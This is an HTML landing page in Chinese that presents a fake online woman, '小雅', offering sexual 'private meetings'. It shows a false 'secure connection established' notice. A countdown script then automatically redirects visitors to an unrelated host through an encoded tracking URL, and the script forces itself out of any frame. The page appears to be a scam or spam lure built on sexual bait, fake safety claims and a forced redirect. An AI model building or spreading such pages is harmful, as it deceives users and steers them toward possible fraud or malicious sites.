<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>小雅在线</title>
    <link rel="shortcut icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💋</text></svg>">
    
    <style type="text/css">
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%);
            color: #333;
            font-size: 16px;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .special-text {
            font-family: "Times New Roman", serif;
            letter-spacing: 1px;
            font-style: italic;
        }

        /* 安全提示条 */
        .safe-notice {
            background: linear-gradient(45deg, #e8fef2, #f0fff4);
            border: 1px solid #2ecc71;
            color: #27ae60;
            padding: 12px 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
            text-align: center;
            box-shadow: 0 3px 10px rgba(46, 204, 113, 0.2);
            max-width: 350px;
            width: 100%;
            font-weight: 500;
        }

        .chat-container {
            background: white;
            border-radius: 20px;
            padding: 40px 30px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.15);
            max-width: 350px;
            width: 100%;
            text-align: center;
        }

        .avatar {
            width: 80px;
            height: 80px;
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 35px;
            margin: 0 auto 20px;
            box-shadow: 0 8px 20px rgba(255, 107, 107, 0.3);
        }

        .name-tag {
            font-size: 22px;
            font-weight: bold;
            color: #333;
            margin-bottom: 8px;
        }

        .status {
            font-size: 14px;
            color: #2ecc71;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .online-dot {
            width: 8px;
            height: 8px;
            background: #2ecc71;
            border-radius: 50%;
            margin-right: 6px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        .message {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 15px;
            margin-bottom: 25px;
            font-size: 16px;
            line-height: 1.5;
            color: #333;
        }

        .highlight {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: white;
            font-weight: bold;
            padding: 15px;
            border-radius: 12px;
            margin-bottom: 25px;
            font-size: 16px;
        }

        .chat-button {
            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
            color: white;
            border: none;
            padding: 18px 30px;
            border-radius: 30px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.4);
            margin-bottom: 15px;
        }

        .chat-button:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 107, 107, 0.6);
        }

        .chat-button:active {
            transform: translateY(0);
        }

        /* 倒计时样式 */
        .countdown {
            background: linear-gradient(45deg, #e3f2fd, #f0f8ff);
            color: #1976d2;
            padding: 12px;
            border-radius: 10px;
            margin-bottom: 15px;
            font-size: 14px;
            border: 1px solid #90caf9;
            box-shadow: 0 2px 8px rgba(25, 118, 210, 0.15);
        }

        .countdown-number {
            font-weight: bold;
            font-size: 18px;
            color: #e74c3c;
        }

        .note {
            font-size: 12px;
            color: #999;
            line-height: 1.3;
        }

        @media (max-width: 480px) {
            .safe-notice,
            .chat-container {
                margin: 0 10px;
            }
            
            .chat-container {
                padding: 30px 25px;
            }
        }
    </style>
</head>
<body>
    <!-- 安全提示 -->
    <div class="safe-notice">
        🔒 安全连接已建立，正在为您跳转到聊天页面
    </div>

    <div class="chat-container">
        <!-- 头像区域 -->
        <div class="avatar">👩‍🦰</div>
        <div class="name-tag">小雅</div>
        <div class="status">
            <div class="online-dot"></div>
            23岁 • 在线中
        </div>

        <!-- 简短消息 -->
        <div class="message">
            嗨～ 想和我<span class="special-text">深入聊聊</span>吗？ 💕
        </div>

        <div class="highlight">
            只进入身体，不进入生活<br>
            我们可以<span class="special-text">私密见面</span>哦～
        </div>

        <!-- 倒计时提示 -->
        <div class="countdown" id="countdown">
            <span class="countdown-number" id="countdownNumber">3</span> 秒后自动进入聊天
        </div>

        <!-- 聊天按钮 -->
        <button class="chat-button" onclick="startChat()">
            💬 立即开始聊天
        </button>
        
        <div class="note">
            🔒 私密安全 • 仅限25岁+
        </div>
    </div>

    <script>
        var targetUrl = "http://sdqbdl.com/static/backup/sql/top.html?d=DxsAHxlTTkIOAkVBCxpPDgMBWgICBwQfSQwaQF1fFBRWVwxAWTEMHA0pABsJRlBaUl9FW1xZWVRfW0JBAh0MAQ%3D%3D";
        
        var countdown = 3;
        var countdownTimer;
        
        // 开始倒计时
        function startCountdown() {
            var countdownElement = document.getElementById('countdownNumber');
            var countdownContainer = document.getElementById('countdown');
            
            countdownTimer = setInterval(function() {
                countdown--;
                countdownElement.textContent = countdown;
                
                if (countdown <= 0) {
                    clearInterval(countdownTimer);
                    countdownContainer.innerHTML = '正在进入聊天室...';
                    countdownContainer.style.background = 'linear-gradient(45deg, #e8f5e8, #f0fff0)';
                    countdownContainer.style.color = '#2d5a2d';
                    countdownContainer.style.borderColor = '#81c784';
                    
                    // 跳转
                    window.location.href = targetUrl;
                }
            }, 1000);
        }
        
        // 手动点击聊天按钮
        function startChat() {
            clearInterval(countdownTimer);
            
            var button = document.querySelector('.chat-button');
            var countdownContainer = document.getElementById('countdown');
            
            button.innerHTML = '💕 连接中...';
            button.style.background = 'linear-gradient(45deg, #4caf50, #388e3c)';
            countdownContainer.innerHTML = '正在连接小雅...';
            countdownContainer.style.background = 'linear-gradient(45deg, #e8f5e8, #f0fff0)';
            countdownContainer.style.color = '#2d5a2d';
            countdownContainer.style.borderColor = '#81c784';
            
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 800);
        }
        
        // 页面加载完成后开始倒计时
        document.addEventListener('DOMContentLoaded', function() {
            startCountdown();
        });
        
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
    </script>
</body>
</html>
